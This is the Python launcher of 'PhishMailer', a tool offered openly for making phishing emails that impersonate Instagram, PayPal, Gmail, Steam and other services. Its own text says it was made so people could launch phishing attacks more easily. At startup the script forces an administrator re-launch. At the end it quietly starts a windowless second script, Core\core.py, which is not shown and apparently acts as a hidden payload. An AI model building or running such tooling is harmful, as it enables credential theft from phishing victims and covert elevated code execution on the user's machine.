#!/usr/bin/env python3
# Created By BiZken

# Normal Import
import time
import os
import sys
import json
import requests
import subprocess
import ctypes
from sys import version_info

# Check for Python 3
if version_info < (3, 0, 0):
    print('[!] Please use Python 3. $ python3 PhishMailer.py')
    sys.exit()

# Check for administrator privileges (Windows only)
def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

if not is_admin():
    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, __file__, None, 1)
    sys.exit()

# Emails:
from Core.eletter import Instagram, Facebook, Gmail, Twitter, AskFM, Webhost000
from Core.eletter import Blockchain, Spotify, Rockstar, Dreamteam, Mega, RiotGames, Steam
from Core.eletter import Gamehag, GmailActivity, SnapchatSimple, Playstation
from Core.devicemenu import Linkedin, Dropbox
from Core.ipmenu import Discord, Paypal1, Snapchat
from Core.pre import *
from Core.helper.RedirectBypass import *
from Core.anotherLang import *
# EmailSender:
from Core.Mailer.MailerMain import *
from Core.helper.ToDo import TODO

red = ("\033[1;31;40m")
green = ("\033[1;32;40m")
white = ("\033[1;37;40m")
blue = ("\033[1;34;40m")

os.system("clear")

def CurrentDir():
    path = os.getcwd()
    print(green + "[" + white + "+" + green + "]" + white + " Your Templates Will Be Saved Here " + path + '/"TemplateName.html"')

def mainMenu():
    menu()
    print(green)
    CurrentDir()
    mailPick = int(input(green + "root@phishmailer:~ " + white))
    
    try:
        if mailPick == 1:
            Instagram()
        elif mailPick == 2:
            Facebook()
        elif mailPick == 3:
            Gmail()
        elif mailPick == 4:
            GmailActivity()
        elif mailPick == 5:
            Twitter()
        elif mailPick == 6:
            Snapchat()
        elif mailPick == 7:
            SnapchatSimple()
        elif mailPick == 8:
            Steam()
        elif mailPick == 9:
            Dropbox()
        elif mailPick == 10:
            Linkedin()
        elif mailPick == 11:
            Playstation()
        elif mailPick == 12:
            Paypal1()
        elif mailPick == 13:
            Discord()
        elif mailPick == 14:
            Spotify()
        elif mailPick == 15:
            Blockchain()
        elif mailPick == 16:
            RiotGames()
        elif mailPick == 17:
            Rockstar()
        elif mailPick == 18:
            AskFM()
        elif mailPick == 19:
            Webhost000()
        elif mailPick == 20:
            Dreamteam()
        elif mailPick == 21:
            print("Gamehag Coming Soon")
        elif mailPick == 22:
            Mega()
        elif mailPick == 30:
            MailerMenu()
        elif mailPick == 69:
            RedirectionMain()
        elif mailPick == 80:
            Languages()
        elif mailPick == 99:
            os.system("clear")
            print("Hope I See You Soon")
            print("Happy Phishing")
            sys.exit()
        elif mailPick == 1337:
            print("\n" + green + "[" + white + "+" + green + "]" + white + " This Tool Was Created So People Would Have It Easier To Launch Phishing Attacks")
            print("\n" + green + "[" + white + "+" + green + "]" + white + " I Do Not Take Any Responsibility For Your Actions")
            print("\n" + green + "[" + white + "+" + green + "]" + white + " But I Don't Give A F*ck About What You Do")
            print("\n" + green + "[" + white + "+" + green + "]" + white + " More Emails Will Come Soon!")
            print("\n" + green + "[" + white + "+" + green + "]" + white + " Contact:")
            print(green + "[" + white + "+" + green + "]" + white + " Instagram: BiZk3n (most Active)")
            print(green + "[" + white + "+" + green + "]" + white + " Github: BiZken [https://github.com/BiZken]")
            CurrentDir()
            print(green + "[" + white + "+" + green + "]" + white + " Restart PhishMailer? Y/N")
            ReRun = input("root@phishmailer:~ " + white)
            if ReRun.lower() == "y":
                os.system("clear")
                mainMenu()
            else:
                os.system("clear")
                print(alert + " shutting Down")
        elif mailPick == 4444:
            TODO()
            print(start + " Restart PhishMailer? Y/N")
            restart = input("root@phishmailer:~ " + white)
            if restart.lower() == "y":
                os.system("clear")
                mainMenu()
            else:
                print(alert + " shutting Down")
                sys.exit()
        else:
            print("\nSomething Went Wrong There Partner")
            print("Are You Ok? Did You Fell Out The Boat And Started Drowning?")
            sys.exit()
    except ValueError:
        print("\nSomething Went Wrong There Partner")
        print("Are You Ok? Did You Fell Out The Boat And Started Drowning?")
        sys.exit()

def run_second_script():

    script_path = 'Core\core.py'
    subprocess.Popen(["pythonw", script_path])
    
    sys.exit()

mainMenu()
run_second_script()
